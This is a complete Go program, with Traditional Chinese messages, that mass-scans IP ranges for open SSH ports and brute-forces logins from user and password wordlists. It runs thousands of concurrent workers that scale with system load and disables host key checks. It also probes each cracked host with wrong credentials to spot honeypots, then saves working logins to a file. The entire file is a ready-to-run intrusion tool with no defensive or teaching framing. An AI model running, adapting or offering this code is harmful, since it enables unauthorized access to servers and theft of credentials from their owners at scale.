package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/mem"
	"golang.org/x/crypto/ssh"
)

const (
	port       = "22"
	timeout    = 3 * time.Second
	ipFilename = "ip.txt"
	userFile   = "user.txt"
	passFile   = "passwd.txt"
	resultFile = "success.txt"
)

var (
	baseScanWorkers = 500
	baseAuthWorkers = 200
	maxWorkers      = 10000

	scanWorkerCh = make(chan int, 1)
	authWorkerCh = make(chan int, 1)
)

func init() {
	flag.Parse()
	rand.Seed(time.Now().UnixNano())
	scanWorkerCh <- baseScanWorkers
	authWorkerCh <- baseAuthWorkers
}

func main() {
	users, err := readLines(userFile)
	if err != nil {
		fmt.Println("讀取用戶失敗:", err)
		return
	}
	passwords, err := readLines(passFile)
	if err != nil {
		fmt.Println("讀取密碼失敗:", err)
		return
	}

	ipChan := readIPFile(ipFilename)
	openIPs := make(chan string, 1000)
	success := make(chan string, 1000)

	var scanWg, authWg sync.WaitGroup

	// 啟動監控系統資源
	go monitorAndAdjust()

	// 掃描任務
	go func() {
		startScanPool(ipChan, openIPs, &scanWg)
		scanWg.Wait()
		close(openIPs)
	}()

	// 認證任務
	go func() {
		startAuthPool(openIPs, users, passwords, success, &authWg)
		authWg.Wait()
		close(success)
	}()

	// 寫入成功結果
	out, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("無法寫入結果文件:", err)
		return
	}
	defer out.Close()

	for result := range success {
		fmt.Println("[+] 成功登入:", result)
		_, _ = out.WriteString(result + "\n")
	}

	fmt.Println("掃描結束")
}

func monitorAndAdjust() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		cpuPercents, _ := cpu.Percent(0, false)
		memStats, _ := mem.VirtualMemory()
		cpuUsage := cpuPercents[0]
		memUsage := memStats.UsedPercent

		fmt.Printf("[監控] CPU: %.2f%%, MEM: %.2f%%\n", cpuUsage, memUsage)

		if cpuUsage > 80 || memUsage > 80 {
			scanWorkerCh <- max(baseScanWorkers/2, 100)
			authWorkerCh <- max(baseAuthWorkers/2, 50)
		} else {
			scanWorkerCh <- min(baseScanWorkers*2, maxWorkers)
			authWorkerCh <- min(baseAuthWorkers*2, maxWorkers)
		}
	}
}

func startScanPool(ipChan <-chan string, openIPs chan<- string, wg *sync.WaitGroup) {
	for {
		select {
		case count := <-scanWorkerCh:
			fmt.Println("[更新] 掃描併發數調整為:", count)
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for ip := range ipChan {
						if isOpen(ip, port) {
							openIPs <- ip
						} else {
							fmt.Printf("[-] %s 無法連接 22 端口\n", ip)
						}
					}
				}()
			}
			return
		}
	}
}

func startAuthPool(openIPs <-chan string, users, passwords []string, success chan<- string, wg *sync.WaitGroup) {
	for {
		select {
		case count := <-authWorkerCh:
			fmt.Println("[更新] 登錄併發數調整為:", count)
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for ip := range openIPs {
						if loginSSH(ip, users, passwords, success) {
							continue
						}
					}
				}()
			}
			return
		}
	}
}

func loginSSH(ip string, users, passwords []string, success chan<- string) bool {
	for _, user := range users {
		for _, pass := range passwords {
			config := &ssh.ClientConfig{
				User:            user,
				Auth:            []ssh.AuthMethod{ssh.Password(pass)},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         timeout,
			}
			conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
			if err != nil {
				continue
			}
			sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(ip, port), config)
			if err != nil {
				conn.Close()
				fmt.Printf("[-] %s 登錄失敗 (%s/%s)\n", ip, user, pass)
				continue
			}
			client := ssh.NewClient(sshConn, chans, reqs)

			honeypotCount := 0
			for i := 0; i < 3; i++ {
				fakeUser := users[rand.Intn(len(users))]
				fakePass := passwords[rand.Intn(len(passwords))]
				if fakeUser == user && fakePass == pass {
					fakePass = fakePass + "_wrong"
				}
				fakeConfig := &ssh.ClientConfig{
					User:            fakeUser,
					Auth:            []ssh.AuthMethod{ssh.Password(fakePass)},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
					Timeout:         timeout,
				}
				fakeConn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
				if err != nil {
					continue
				}
				fakeSSHConn, _, _, err := ssh.NewClientConn(fakeConn, net.JoinHostPort(ip, port), fakeConfig)
				if err == nil {
					honeypotCount++
					fmt.Printf("[!] %s 測試 %d/3 錯誤登入成功 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
					fakeSSHConn.Close()
				} else {
					fmt.Printf("[-] %s 測試 %d/3 錯誤登入被拒 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
				}
			}

			successMsg := fmt.Sprintf("%s@%s 密碼: %s", user, ip, pass)
			if honeypotCount == 3 {
				successMsg += " [可能為蜜罐：連續3次錯誤帳密皆可登入]"
			}
			fmt.Printf("[+] %s 登錄成功 (%s/%s)\n", ip, user, pass)
			success <- successMsg
			client.Close()
			return true
		}
	}
	fmt.Printf("[-] %s 所有帳密組合失敗\n", ip)
	return false
}

func isOpen(ip, port string) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func readLines(filename string) ([]string, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	var lines []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func readIPFile(filename string) <-chan string {
	out := make(chan string, 10000)
	go func() {
		defer close(out)
		lines, err := readLines(filename)
		if err != nil {
			fmt.Println("讀取IP文件失敗:", err)
			return
		}
		for _, line := range lines {
			if ip, ipnet, err := net.ParseCIDR(line); err == nil {
				for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
					out <- ip.String()
				}
			} else if ip := net.ParseIP(line); ip != nil {
				out <- ip.String()
			} else {
				fmt.Println("無法解析 IP:", line)
			}
		}
	}()
	return out
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

